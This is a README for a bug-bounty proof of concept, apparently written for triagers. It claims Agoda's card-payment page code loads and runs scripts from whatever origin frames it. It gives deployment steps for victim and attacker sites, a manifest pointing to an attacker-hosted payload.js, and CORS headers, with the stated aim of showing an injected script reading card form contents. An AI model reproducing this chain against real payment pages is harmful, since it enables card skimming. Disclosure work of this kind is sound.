# Agoda PCI Payment Page — Working PoC

Demonstrates, live in the browser (not a video, not a simulation), that Agoda's real,
unmodified card-payment page JavaScript will fetch a script manifest **from whatever
origin frames it**, and execute the scripts that manifest points to **inside the PCI
card-entry origin**. This reproduces the mechanism described in the submitted report
without ever touching Agoda's infrastructure — both "sides" of the demo are hosted by
you, and the only "Agoda" content involved is the real page's own publicly-served,
byte-for-byte unmodified client-side code.

There are two folders. `victim/` = a stand-in for `gwpci.agoda.com`, running Agoda's
real page logic untouched. `attacker/` = the malicious framing origin (what
`solution.net` could be if someone hostile controlled it).

## Why two separate deployments (not one)

The bug is specifically about **cross-origin** trust — the victim page trusting
whatever origin frames it. If both folders were hosted on the same domain, the demo
would still run but wouldn't actually cross an origin boundary, which is the whole
point. So: two independent static sites, on two different hosts/subdomains.

## Deploy — Option A: GitHub + Cloudflare Pages (if you want this on GitHub)

GitHub Pages by itself **cannot** host the `attacker` folder — it doesn't support
custom response headers, and the `attacker/getClientSideAssets` and `attacker/payload.js`
responses need the `Access-Control-Allow-Origin`/`Access-Control-Allow-Credentials`
headers in `attacker/_headers` to work (a real attacker controlling `solution.net`
would just configure this on their own server — it's a faithful part of the
reproduction, not a workaround). GitHub Pages is fine for `victim/` (no special
headers needed there), but for `attacker/` use **Cloudflare Pages** — it's free, deploys
straight from a GitHub repo, and honors a `_headers` file with the exact same syntax.

1. **Create one GitHub repo** (public is fine — it contains nothing sensitive: Agoda's
   own already-public JS, plus a harmless demo script). Push this whole folder
   (`victim/`, `attacker/`, this README) to it.
2. **Cloudflare Pages, project 1 (victim):** go to https://pages.cloudflare.com →
   "Create a project" → "Connect to Git" → pick your repo → under build settings set
   **"Root directory" = `victim`** (leave build command empty, it's static) → Save and
   Deploy. You get a stable URL like `https://<project-name>.pages.dev`. Call it
   `VICTIM_URL`.
3. **Cloudflare Pages, project 2 (attacker):** repeat step 2 on the **same repo**, but
   create it as a **second, separate project** with **"Root directory" = `attacker`**.
   You get a second, different `https://<other-project-name>.pages.dev` URL. Call it
   `ATTACKER_URL`. (It won't work correctly yet — expected, config isn't filled in.)
4. **Fill in the three placeholders** (see "Step 3" under Option B below — identical
   edits regardless of host) using the two `.pages.dev` URLs you just got, then
   `git commit` + `git push`. Cloudflare auto-redeploys the attacker project on push;
   its URL stays the same.
5. Send `ATTACKER_URL` (the `attacker` project's `.pages.dev` link) as the PoC link.

(GitHub Pages alone works fine if you only want somewhere to put `victim/` — pair it
with Cloudflare Pages for `attacker/` only. You don't need GitHub at all for either
side if you'd rather skip git entirely — see Option B.)

## Deploy — Option B: Netlify Drop (free, no CLI, no git, ~5 minutes total)

**Step 1 — deploy the victim folder, get its URL.**
1. Go to https://app.netlify.com/drop
2. Drag the `victim` folder onto the page.
3. It deploys instantly and gives you a URL like `https://random-name-1.netlify.app`.
4. **Click "Claim this site"** (or sign up free — takes 30 seconds) so the URL stays
   stable. You don't need to edit anything in this folder — it's untouched.
5. Note this URL. Call it `VICTIM_URL`.

**Step 2 — deploy the attacker folder once, just to learn its own URL.**
1. Drag the `attacker` folder onto https://app.netlify.com/drop the same way.
2. Claim this site too. Note its URL, e.g. `https://random-name-2.netlify.app`.
   Call it `ATTACKER_URL`.
3. It won't work correctly yet — that's expected, you haven't filled in the config yet.

**Step 3 — fill in the two URLs. Three small edits, all clearly marked:**

1. `attacker/index.html` — find `__VICTIM_URL__` (appears twice) and replace both with
   your real `VICTIM_URL` from Step 1, e.g.:
   ```html
   <iframe id="victim" src="https://random-name-1.netlify.app"></iframe>
   ...
   var VICTIM_URL = "https://random-name-1.netlify.app";
   ```
2. `attacker/getClientSideAssets` — replace `__ATTACKER_URL__` with your real
   `ATTACKER_URL` from Step 2:
   ```json
   [{"assetType": "js", "path": "https://random-name-2.netlify.app/payload.js"}]
   ```
3. `attacker/_headers` — replace `__VICTIM_URL__` with your real `VICTIM_URL` again
   (must be scheme + host, no trailing slash, no path):
   ```
   /getClientSideAssets
     Access-Control-Allow-Origin: https://random-name-1.netlify.app
     Access-Control-Allow-Credentials: true
   ```
   (This header is required because the real vulnerable code makes a credentialed
   cross-origin request for the manifest — a real attacker controlling `solution.net`
   would simply configure this on their own server too, so it's a faithful part of
   the reproduction, not a workaround.)

**Step 4 — redeploy the attacker site with the edits.**
Go to your claimed attacker site's dashboard on Netlify → "Deploys" tab → drag the
updated `attacker` folder onto the deploy area there. This updates the **same site**,
so `ATTACKER_URL` does not change.

**Step 5 — send `ATTACKER_URL` as the PoC link.**
That's the one link the triager needs. Opening it and watching it run *is* the test —
no setup, no tooling, no account required on their end.

## What the triager will see

1. The page loads, right side shows an iframe running Agoda's real code.
2. Within a second, the live event log on the left starts printing events —
   these are Agoda's own `dispatchLogEvent()` calls firing for real
   (`GET_ASSETS_LOAD_SUCCESS`, etc.), captured via `postMessage`, not staged.
3. A red-bordered card form appears **inside the iframe**, rendered by the
   attacker's injected script, with a banner stating it was built by an
   attacker-controlled script.
4. The status banner at the top turns green: **"CONFIRMED: attacker-controlled
   script executed inside the PCI origin and read the card form contents"** —
   with the exact captured (test) values shown underneath.
5. A "Run again" button re-runs the whole chain on demand.

Total time from opening the link to seeing the green PASS banner: under 2 seconds.

## Sanity checks before sending

- Open `VICTIM_URL` directly in a tab by itself first — it should load to a blank
  white page (that's correct; it's `<div id="cc-form"></div>` with nothing injected
  yet, since nothing is framing it).
- Open `ATTACKER_URL` and confirm the status banner turns green within ~2 seconds.
- If it stays yellow ("Waiting…") or shows an error in the log: the most likely cause
  is a typo in one of the three edited URLs, or the `_headers` file not matching
  `VICTIM_URL` exactly (scheme + host only, no trailing slash). Re-check Step 3.
- Test in Chrome/Edge (uses `document.location.ancestorOrigins`) and, if you want full
  coverage, Firefox too (uses the `document.referrer` fallback path in Agoda's own
  code — both branches of their real logic get exercised depending on the browser).

## What this does and doesn't prove

**Proves:** the exact mechanism in the report — an origin framing Agoda's real,
unmodified payment-page code can make it fetch and execute arbitrary JavaScript with
full access to the card-entry DOM. This is not staged or simulated; it's Agoda's own
code doing exactly what it does in production, framed by a different origin.

**Doesn't require and doesn't attempt:** framing the real `gwpci.agoda.com`, claiming
or controlling `solution.net`, or any interaction with Agoda's production systems.
That's deliberate — see the report for why a live production framing test was never
performed.
